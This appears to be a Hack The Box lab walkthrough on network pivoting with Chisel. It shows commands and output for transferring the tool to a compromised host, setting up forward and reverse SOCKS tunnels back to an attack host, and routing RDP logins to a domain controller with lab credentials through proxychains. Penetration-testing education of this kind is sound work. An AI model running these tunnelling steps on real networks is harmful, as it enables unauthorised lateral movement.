## Setting Up & Using Chisel
#### Cloning Chisel

```shell
3kjS@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```
#### Building the Chisel Binary

```shell
3kjS@htb[/htb]$ cd chisel 
go build
```
#### Transferring Chisel Binary to Pivot Host

```shell
3kjS@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/ 

ubuntu@10.129.202.64's password: 
chisel                              100%       11MB     1.2MB/s     00:09
```
#### Running the Chisel Server on the Pivot Host

```shell
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5 

2022/05/05 18:16:25 server: Fingerprint 
Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac= 
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```
#### Connecting to the Chisel Server

```shell
3kjS@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks 
2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234 
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening 
2022/05/05 14:21:18 client: tun: Bound proxies 
2022/05/05 14:21:19 client: Handshaking... 
2022/05/05 14:21:19 client: Sending config 
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms) 
2022/05/05 14:21:19 client: tun: SSH connected
```
#### Editing & Confirming proxychains.conf

```shell
3kjS@htb[/htb]$ tail -f /etc/proxychains.conf 

# 
#         proxy types: http, socks4, socks5 
#          ( auth types supported: "basic"-http "user/pass"-socks ) 
# [ProxyList] 
# add proxy here ... 
# meanwile # defaults set to "tor" 
# socks4 127.0.0.1 9050 
socks5 127.0.0.1 1080
```
#### Pivoting to the DC

```shell
3kjS@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
## Chisel Reverse Pivot
#### Starting the Chisel Server on our Attack Host

```shell
3kjS@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5 

2022/05/30 10:19:16 server: Reverse tunnelling enabled 
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk= 
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```
#### Connecting the Chisel Client to our Attack Host

```shell
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks 
2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234 
2022/05/30 14:19:29 client: Handshaking... 
2022/05/30 14:19:30 client: Sending config 
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms) 
2022/05/30 14:19:30 client: tun: SSH connected
```
#### Editing & Confirming proxychains.conf

```shell
3kjS@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList] 
# add proxy here ... 
# socks4 127.0.0.1 9050 
socks5 127.0.0.1 1080
```

```shell
3kjS@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

